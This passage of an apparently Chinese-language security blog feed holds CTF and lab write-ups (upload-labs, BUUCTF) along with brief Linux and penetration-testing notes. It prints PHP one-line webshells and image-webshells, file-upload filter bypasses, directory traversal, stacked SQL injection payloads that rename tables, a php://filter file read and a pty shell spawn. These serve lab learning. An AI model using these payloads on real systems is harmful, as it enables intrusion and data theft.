quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件类型不允许上传！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>几乎过滤了所有的后缀，但却允许大小写逃逸，所有没有对phP进行过滤！</p><p>访问：</p><pre><code>http://127.0.0.1/upload-labs/upload/1.php</code></pre><h1 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h1><p>hints：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1</p><p>|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml</p><p>|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx</p><p>|.cEr|.sWf|.swf|.htaccess后缀文件！</p><p>与第六关相比缺少：</p><pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><p>所以通过抓包在1.php文件后面加一个空格就可以逃逸</p><h1 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h1><p>hints：本pass禁止上传所有可以解析的后缀！</p><p>缺少：</p><pre><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></pre><p>所以利用1.php.来进行逃逸</p><h1 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS-09"></a>PASS-09</h1><p>相比第八关缺少：</p><pre><code> $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></pre><p>::$DATA作用：php在windows中如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名(Windows文件流特性)</p><p>上传一句话木马的.php后缀文件，抓包加::$DATA，上传成功，蚁剑连接（连接的时候要把文件名的::$DATA去掉）</p><h1 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS-10"></a>PASS-10</h1><p>hints：本pass只允许上传.jpg|.png|.gif后缀的文件！</p><p>考察点  .[空格].绕过</p><p>与上一关区别：</p><pre><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code></pre><p>注意拼接部分<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>最后保存的是原始文件，而不是经过检测的文件</p><p>上传1.php. .</p><h1 id="PASS-11"><a href="#PASS-11" class="headerlink" title="PASS-11"></a>PASS-11</h1><p>双写绕过</p><pre><code> $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过</p><p><a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp" target="_blank" rel="noopener">PHP str_ireplace() 函数</a></p><p>将$file_name中的$deny_ext都替换为空</p><h1 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h1><p>hint：本pass上传路径可控！</p><p>也就是白名单过滤</p><p>看源码：</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><pre><code>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Pass-13-00截断"><a href="#Pass-13-00截断" class="headerlink" title="Pass-13-00截断"></a>Pass-13-00截断</h1><p>post进行截断</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>POST不会像GET那样对%00进行自动解码，所以需要在二进制中进行修改  ，将hex改为00</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><h3 id="考察点-图片马上传"><a href="#考察点-图片马上传" class="headerlink" title="考察点  图片马上传"></a>考察点  图片马上传</h3><p>可以将图片带入到PHP代码里，从而导致PHP代码执行</p><h4 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h4><p>GIF的文件头GIF89a ,ZIP压缩文件文件头PK   ,7z压缩文件文件头7z</p><pre><code>法1.创建一个空的.php文件，用notepad++写入GIF89a  &lt;?php @eval($_POST[value]);?&gt;法2.gif后缀文件,用notepad++写入一句话木马</code></pre><p>把制作好的图片马上传，打开<code>文件包含漏洞</code>发送GET请求<code>？file=upload/图片文件名</code>，蚁剑连接即可</p><p>需要开启file读取权限</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-14</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-15</p><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">Pass-17</a></h1><p>有待深究</p><h1 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h1><p>所谓条件竞争，就是利用…..</p><p> 原因：后端文件没有进行严格的加锁设置，导致可以多用户同时访问一个文件</p><p>原理：php木马文件上传后端后，根据策略对文件审查，审查为php文件则进行移除，而当其审查之时我们访问php木马，造成文件竞争，进而php文件执行自身代码，创建其中命令</p><p> 木马文件（jingzheng.php）：</p><p> <code>&lt;?php $a = &#39;&lt;?php @eval($_POST[\&#39;a\&#39;])?&gt;&#39;;file_put_contents(&#39;1.php&#39;,$a)?&gt;</code></p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">PHP file_put_contents() 函数</a></p><p><a href="https://blog.csdn.net/qq_35350265/article/details/113337635" target="_blank" rel="noopener">操作细节</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux笔记</title>
      <link href="/2021/01/15/linux-bi-ji/"/>
      <url>/2021/01/15/linux-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1811084968&auto=1&height=66"></iframe><h1 id="Linux命令复习："><a href="#Linux命令复习：" class="headerlink" title="Linux命令复习："></a>Linux命令复习：</h1><p>mkdir (file)：创建一个文本夹</p><p>touch 创建txt文件</p><p>dir：查看当前的目录</p><p>ls -la：查看当前文件并更多信息（如：文件所被给予的权限）</p><p>rm <file>：-rf强行删除文件</file></p><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p><p><a href="https://www.runoob.com/linux/linux-comm-ping.html" target="_blank" rel="noopener">ping命令</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试笔记</title>
      <link href="/2021/01/15/shen-tou-ce-shi-bi-ji/"/>
      <url>/2021/01/15/shen-tou-ce-shi-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1426649237&auto=1&height=66"></iframe><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="1-信息收集阶段"><a href="#1-信息收集阶段" class="headerlink" title="1.信息收集阶段"></a>1.信息收集阶段</h2><h3 id="资产收集："><a href="#资产收集：" class="headerlink" title="资产收集："></a>资产收集：</h3><p>1.从主域名出发，向其旁站扩散</p><p>2.子域名收集（layer子域名挖掘机（枚举性质），<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>（根据接口，需要配置api：在\OneForAll-master\config\api.py ）），相关域名收集</p><p>3.通过搜索引擎（第三方）：常用第三方子域名爆破接口</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/（旁站查询）" target="_blank" rel="noopener">https://chapangzhan.com/（旁站查询）</a></p><p>4.app，小程序，公众号</p><p>5.备案信息查询（基本无效信息）：</p><p>爱站网，<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></p><p>6.ip信息收集：有的企业做了cdn加速，例如使用七牛云针对图床进行加速，所以就需要进行cdn的绕过，来找到被加速的服务器（ip地址）</p><p>绕过方法：</p><ul><li><p><strong>多地ping</strong>（国外）</p></li><li><p><strong>对分站进行ping</strong></p></li></ul><p>7.在线cms指纹识别</p><p>云悉指纹：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>潮汐指纹：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.服务器/中间器/站点架构信息</p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>如果遇到网络问题：service networking restart重启一下网络服务</p><p>-p 8011（指定8011端口）</p><p>-F（快速扫描） -iL（从文本文件里面扫描主机列表，多线程）1.txt -v</p><h2 id="msf工具"><a href="#msf工具" class="headerlink" title="msf工具"></a>msf工具</h2><p>建立一个交互式的shell</p><pre><code>shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;#前提是找到该框架的漏洞，并且打入进去</code></pre><p>## </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Web</title>
      <link href="/2021/01/15/buuctf-zhi-web/"/>
      <url>/2021/01/15/buuctf-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=66"></iframe><h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021-01-15"></a>2021-01-15</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p><p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p><p>1打开后会发现是代码审计</p><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;                /**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/            }            if (in_array($page, $whitelist)) {                return true;                /**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            /**            对mb_substr函数的解释：函数返回字符串的一部分，针对中文            &lt;?php               echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);               // 输出：菜鸟            ?&gt;            mb_strpos (要被检查的字符串,要搜索的字符串)            &lt;?php             $str = &#39;http://www.feiniaomy.com&#39;;             echo mb_strpos($str,&#39;niao&#39;);            ?&gt;            输出结果：14            这里整个嵌套意思是截取page中’?‘前部分             **/            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            /**            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码            **/            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p><p>也就是说flag在这个文件里面</p><p>所以说这个经过分析完以后，就是结构/?file=source.php?/../../../../ffffllllaaaagggg</p><p>然后就是对？进行url编码%253F这里../就是</p><p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p><p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p><p>没什么东西</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>输入1’</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p><p>输入：1’ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p><p>输入：1’ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p><p>考虑堆叠注入（学到了）：</p><p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p><p>输入：1’;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>输入：-1’;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>输入：-1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>输入：1’;show columns from words;#（查看表words表的字段）</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p><strong>注意（重点）</strong>：</p><pre><code>  - 1&#39; or 1=1#    希望展示所有内容  - 一般SQL代码中会有这copy么一段select * from （表名） where = 变量，  - 当通过注入后会变成select * from （表名）  where id = 变量 OR 1=1;  - 就会使百where后面的表达式变成一句可有可无的表达式，因为or前面执行成功，且1=1为真。不会报错  - 就与select * from （表名）相等然后就可以通过这种句式来取得当前数据表中所有的用户信息答。  - 但显然失败了，猜测表名应该是words，所以才没有显示flag，所以可能是select * from words where id = 变量</code></pre><pre><code>1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</code></pre><p>解释：</p><pre><code>- rename table `words` to `words1`; 修改表 words 改名为其它，- rename table `1919810931114514` to `words`;修改表 1919810931114514 改名为 words ，- alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;修改列 flag 改名为 id ，- 或者可以 alter table words add id int unsigned not Null auto_increment primary key;在表 1919810931114514 插入一列 id，- 然后再 1&#39; or 1=1# ，展示flag</code></pre><h3 id="2021-4-27补充："><a href="#2021-4-27补充：" class="headerlink" title="2021-4-27补充："></a>2021-4-27补充：</h3><p>已经学习完了alter语句，和预变量</p><p>这里主要对预处理进行解释：</p><pre><code>SET @tn = &#39;`1919810931114514`&#39;;  //存储表名SET @sql = concat(&#39;select * from &#39;, @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句</code></pre><p>或者：</p><p>利用char()函数将select字符串的ASCII码转为select字符串，接着用concat()函数镜像拼接到select查询语句，从而绕过过滤</p><pre><code>1&#39;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>flag{e5334182-fc16-4c20-8ac3-753301d2925d}</code></pre><p>VARCHAR(size)：保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p><p>特点：文件包含，/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64得：</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>小马：</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>首先上传.php文件发现对后缀进行了限制</p><p>改为shell.php.png同时抓包删除png</p><p>得到一个页面以后查看源代码发现：</p><p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p><p>发现确实存在，但是被重命名了，而且变成了一个png</p><p>重新尝试后缀绕过shell.phtml（通过抓包修改）</p><p>得到：</p><p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p><p>回到根目录查看flag即可</p><p>或者数据终端cat /flag</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>用户名：1’ or 1=1#</p><p>密码：123</p><p>得到flag：flag{161e4d70-8d13-4f80-8a96-c01d5eb7b540}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源代码：</p><pre><code>                &lt;!--        $cat=$_GET[&#39;cat&#39;];        echo $cat;        if($cat==&#39;dog&#39;){            echo &#39;Syc{cat_cat_cat_cat}&#39;;        }        --&gt;</code></pre><p>构造参数?cat=dog,结果直接得到了flag：flag{1fb1365e-7d13-4ee4-94ec-e93656f4d96e}</p><p>什么情况？？这也太。。。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入1的结果与输入3-2的结果一样。所以判断为整数型注入，接下来构造注入语句：</p><p>当我输入-1 union select 1,2#和其他字符转的时候，都会被转义，所以就很有可能是被转义了，联合查询放弃，考虑堆叠注入：</p><p>1;show databases;#（展现所有数据库）</p><p>得到结果：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</code></pre><p>我感觉在test里面，构造语句：1;show tables from test;#结果是一点不好使</p><p>当输入1;show tables;时候回显：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></pre><p>ok，看wp吧：也不知道是怎么想的，</p><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>输入的内容为*,1</p><p>内置的sql语句为：select $post[‘query’]||flag from Flag</p><p>如果$post[‘query’]的数据为<em>,1，sql语句就变成了select </em>,1||flag from Flag（此时||是逻辑“或”）也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>1.输入 1 或 0 查询结果如图，要想办法让 ||不是逻辑或<br>官方给的 payload 是1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>拼接一下就是select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p><p>关于 sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符</p><p>2.这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个||相当于是将 select 1 和 select flag from flag 的结果拼接在一起</p><p>自我理解：sql_mode=PIPES_AS_CONCAT将后面查询的结果同时输出</p><p>不错，挺好的题，盗：</p><pre><code>附加几种常见的sql_mode值的介绍：几种常见的mode介绍ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULLNO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</code></pre><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>后端结构是username=’’passwd=’’</p><p>注入开始：username=’1’ or 1 = 1#passwd=’’</p><p>得到回显：<strong>Hello admin！</strong></p><p><strong>Your password is ‘817b66fd2bafc98336e2618cf0e66578’</strong></p><p>构造username=’admin’passwd=’817b66fd2bafc98336e2618cf0e66578’</p><p>密码是flag嘛。。。flag{817b66fd2bafc98336e2618cf0e66578}也不对，难道密码是个表？？继续构造：</p><p>username=’admin’ union select table_name from 817b66fd2bafc98336e2618cf0e66578#’passwd=’’</p><p>得到：<strong>Table ‘geek.817b66fd2bafc98336e2618cf0e66578’ doesn’t exist</strong></p><p>继续：username=’admin’ order by 3#’passwd=’’</p><p>返回结果与成功登陆admin结果一样</p><p>继续admin’ order by 4#</p><p>得到回显：<strong>Unknown column ‘4’ in ‘order clause’</strong>，好，3列确定了，继续构造：1’ union select 1,2,3#得到：</p><p><strong>Hello 2！</strong><br><strong>Your password is ‘3’</strong></p><p>懂了：</p><pre><code>1&#39; union select 1,2,database()#</code></pre><p>得到数据库<strong>geek</strong></p><pre><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is 